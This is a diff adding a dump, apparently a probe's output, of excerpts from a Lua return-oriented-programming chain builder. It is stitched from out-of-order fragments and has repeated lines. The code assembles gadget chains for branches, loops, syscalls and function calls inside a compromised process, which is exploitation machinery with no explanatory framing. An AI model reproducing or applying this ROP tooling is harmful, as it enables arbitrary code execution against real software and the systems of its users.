@@ -1,0 +1,119 @@
+=== PROBE 126b: ROPCHAIN SOURCE ===
+size=18338
+total lines=530
+370: end
+371: function ropchain:dispatch_jumptable_with_rax_index(jump_table)
+372:     self:push_set_rcx(3)
+373:     self:push(gadgets["shl rax, cl; ret"])
+374:     self:push_add_to_rax(jump_table)
+375:     self:push(gadgets["mov rax, [rax]; ret"])
+376:     self:push_set_reg_from_rax("rsp")
+377: end
+378: -- only unsigned 32-bit comparison is supported
+379: function ropchain:create_branch(value_address, op, compare_value)
+380:     self:push_set_rax(value_address)
+381:     self:push_set_rbx(compare_value)
+382:     self:push(gadgets["cmp [rax], ebx; ret"])
+383:     self:push_set_rax(0)
+384:     if op == "==" then
+385:         self:push(gadgets["sete al; ret"])
+386:     elseif op == "~=" then
+387:         self:push(gadgets["setne al; ret"])
+388:     elseif op == ">" then
+389:         self:push(gadgets["seta al; ret"])
+390:     elseif op == "<" then
+391:         self:push(gadgets["setb al; ret"])
+392:     else
+393:         errorf("ropchain:create_branch: invalid op (%s)", op)
+394:     end
+395:     local jump_table = memory.alloc(0x10)
+396:     self:dispatch_jumptable_with_rax_index(jump_table)
+397:     return jump_table
+398: end
+399: -- gen "if statement" style code 
+400: function ropchain:gen_conditional(value_address, op, compare_value, callback)
+401:     local jump_table = self:create_branch(value_address, op, compare_value)
+402:     
+403:     -- if memory[value_address] <op> compare_value then
+404:         local jmp_cond_true = self:get_rsp()
+405:         callback()
+406:     -- end
+407:     local jmp_cond_false = self:get_rsp()
+408:     memory.write_multiple_qwords(jump_table, {
+409:         jmp_cond_false, -- comparison false
+410:         jmp_cond_true, -- comparison true
+411:     })
+412: end
+413: -- gen "while statement" style loop
+414: function ropchain:gen_loop(value_address, op, compare_value, callback)
+415:     local loopback = self:get_rsp()
+416:     local jump_table = self:create_branch(value_address, op, compare_value)
+417:     
+418:     -- while memory[value_address] <op> compare_value do
+419:         local jmp_cond_true = self:get_rsp()
+420:         callback()
+
+--- push_syscall_raw ---
+303:     if r9 then self:push_set_r9(r9) end
+304: end
+305: function ropchain:push_syscall_raw(syscall, prep_arg_callback)
+306:     assert(syscall.fn_addr and syscall.syscall_no)
+307:     local push_size = 0
+308:     local push_cb = function()
+309:         self:push_write_qword_memory(self:get_rsp() + push_size, syscall.fn_addr)
+310:         if prep_arg_callback then
+311:             prep_arg_callback()
+312:         end
+313:         self:push_set_rax(syscall.syscall_no)
+314:         self:create_hole(0x10)
+315:     end
+316:     push_size = self:mock_push(push_cb)
+317:     push_cb()
+318:     self:push(0) -- will be overwritten
+319: end
+320: function ropchain:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
+...
+319: end
+320: function ropchain:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
+321:     self:push_syscall_raw(syscall, function()
+322:         self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
+323:     end)
+324: end
+325: function ropchain:push_syscall_with_ret(syscall, rdi, rsi, rdx, rcx, r8, r9)
+326:     self:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
+327:     self:push_store_retval()
+328: end
+329: -- if `is_rip_ptr` is set, rip is assumed to be ptr to the real address
+330: function ropchain:push_fcall_raw(rip, prep_arg_callback, is_rip_ptr)
+331:     local fcall_stub = self.fcall_stub
+332:     if is_rip_ptr then
+333:         self:push_set_rax_from_memory(rip)
+334:         self:push_store_rax_into_memory(fcall_stub.fn_addr)
+335:     else
+336:         self:push_write_qword_memory(fcall_stub.fn_addr, rip)
+...
+
+--- new/constructor ---
+13: function ropchain:new(opt)
+14:     opt = opt or {}
+15:     local self = setmetatable({}, ropchain)
+16:     if not ropchain.dont_recurse then
+17:         self.fcall_stub = ropchain.create_fcall_stub(opt.fcall_stub_padding_size or 0x2000)
+18:     end
+19:     self.stack_size = opt.stack_size or 0x2000
+20:     self.stack_base = opt.stack_base and uint64(opt.stack_base) or memory.alloc(self.stack_size)
+21:     self.align_offset = 0
+22:     self.stack_offset = 0
+23:     -- longjmp overwrites first stack slot with addr to ret gadget
+24:     self.push_ret(self)
+25:     
+26:     -- align stack base to 16 bytes
+27:     if self.stack_base:tonumber() % 16 ~= 0 then
+28:         local jmp_to = align_16(self.stack_base + self.stack_offset) + 0x20
+29:         self.push_set_rsp(self, jmp_to)
+30:         self.align_offset = jmp_to - self.stack_base
+31:         self.stack_offset = 0
+32:     end
+33:     self.retval_addr = {}
+...
+=== END ===
